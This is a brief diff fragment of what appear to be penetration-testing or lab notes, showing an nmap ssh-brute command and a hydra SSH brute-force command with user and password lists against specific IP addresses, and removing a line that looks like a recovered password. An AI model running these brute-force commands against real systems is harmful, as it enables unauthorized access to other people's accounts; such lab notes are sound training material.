@@ -14,5 +14,3 @@ sudo nmap --script ssh-brute --script-args users 192.168.203.122
 ```shell-session
 hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
 ```
-
-4dn1l3M!$
